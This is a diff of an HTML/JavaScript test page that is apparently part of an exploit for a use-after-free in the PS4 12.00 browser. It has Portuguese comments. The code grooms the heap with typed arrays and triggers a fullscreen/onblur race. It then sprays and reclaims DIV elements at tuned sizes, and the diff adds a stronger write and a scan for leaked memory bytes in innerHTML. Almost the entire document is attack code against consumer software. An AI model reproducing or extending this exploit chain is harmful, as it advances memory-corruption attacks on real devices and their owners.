@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Monotype Precision</title>
+<title>PS4 12.00 - UAF Leak Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF Monotype Precision (DIV → DIV)</h2>
+<h2>UAF Leak Stage (Desync + Expand + Scan)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,7 +21,7 @@ function log(msg){
 }
 
 // ==========================
-// 💣 HEAP PRIMING (1 ARRAY)
+// 💣 HEAP PRIMING (CRÍTICO)
 // ==========================
 function setupHeap(){
     let t = new Float64Array(8);
@@ -36,7 +36,7 @@ function setupHeap(){
 // ==========================
 function setupFullscreen(){
 
-    let fsTarget=document.createElement("div");
+    let fsTarget = document.createElement("div");
 
     fsTarget.innerHTML =
         "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
@@ -57,7 +57,7 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 MONOTYPE RECLAIM (DIV)
+// 💣 MONOTYPE RECLAIM
 // ==========================
 function preciseReclaim(size){
 
@@ -65,14 +65,12 @@ function preciseReclaim(size){
 
     let bucket = [];
 
-    // churn leve
     for(let i=0;i<1500;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
-    // spray homogêneo (CRÍTICO)
     for(let i=0;i<size;i++){
 
         let el = document.createElement("div");
@@ -97,7 +95,7 @@ function preciseReclaim(size){
 }
 
 // ==========================
-// 🔬 PROBE COM DESYNC REAL
+// 🔬 PROBE + LEAK
 // ==========================
 function deepProbe(fsTarget){
 
@@ -110,13 +108,8 @@ function deepProbe(fsTarget){
         log("[CHECK] innerHTML = "+html);
         log("[CHECK] textContent = "+text);
 
-        // 🔥 DETECÇÃO DE DESYNC REAL
         if(html && text && !html.includes(text)){
             log("[!!!] DESYNC REAL DETECTADO");
-        }
-
-        if(html && html.includes("CTRL_")){
-            log("[!!!] REUSE VISUAL DETECTADO");
         }
 
     }catch(e){
@@ -125,19 +118,62 @@ function deepProbe(fsTarget){
 
     try{
         let child = fsTarget.firstChild;
-
         log("[CHECK] child = "+child);
         log("[CHECK] nodeType = "+child?.nodeType);
-
     }catch(e){
         log("[UAF] child crash");
     }
 
+    // 💣 WRITE FORTE
     try{
-        fsTarget.innerHTML = "<div>BBBBBBBBB</div>";
+        fsTarget.innerHTML =
+            "<div id='x'>" +
+            "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" +
+            "</div>";
+
         log("[PWN] write OK");
     }catch(e){
         log("[UAF] write crash");
+    }
+
+    // 💣 LEAK EXPANDIDO
+    try{
+        let html = fsTarget.innerHTML;
+
+        let expanded = html.repeat(20);
+
+        log("[LEAK+] len = " + expanded.length);
+        log("[LEAK+] preview = " + expanded.substring(0,100));
+
+        let found = false;
+
+        for(let i=0;i<expanded.length;i++){
+            let c = expanded.charCodeAt(i);
+
+            if(
+                c !== 65 && // A
+                c !== 66 && // B
+                c !== 67 && // C
+                c !== 60 && // <
+                c !== 62 && // >
+                c !== 47 && // /
+                c !== 61 && // =
+                c !== 34 && // "
+                c !== 39 && // '
+                c !== 32    // space
+            ){
+                log("[!!!] BYTE SUSPEITO: " + c);
+                found = true;
+                break;
+            }
+        }
+
+        if(!found){
+            log("[SCAN] sem bytes estranhos");
+        }
+
+    }catch(e){
+        log("[LEAK] erro leitura expandida");
     }
 
     try{
@@ -171,21 +207,18 @@ function trigger(fsTarget){
 
     }catch(e){}
 
-    // 🔥 faixa que já mostrou efeito
     let sizes = [2000, 2200, 2500];
 
     sizes.forEach((size, idx)=>{
         setTimeout(()=>preciseReclaim(size), idx*60);
     });
 
-    // 🔬 probes na janela crítica
     setTimeout(()=>deepProbe(fsTarget), 10);
     setTimeout(()=>deepProbe(fsTarget), 40);
     setTimeout(()=>deepProbe(fsTarget), 80);
     setTimeout(()=>deepProbe(fsTarget), 140);
     setTimeout(()=>deepProbe(fsTarget), 220);
 
-    // 📜 log final
     setTimeout(()=>{
         alert(logBuffer.join("\n"));
     },400);
@@ -200,11 +233,11 @@ function runTest(){
 
     log("[*] Iniciando teste");
 
-    setupHeap(); // 💣 essencial
+    setupHeap();
 
     let fsTarget = setupFullscreen();
 
-    window.onblur=function(){
+    window.onblur = function(){
         log("[*] onblur");
         setTimeout(()=>trigger(fsTarget),3000);
     };
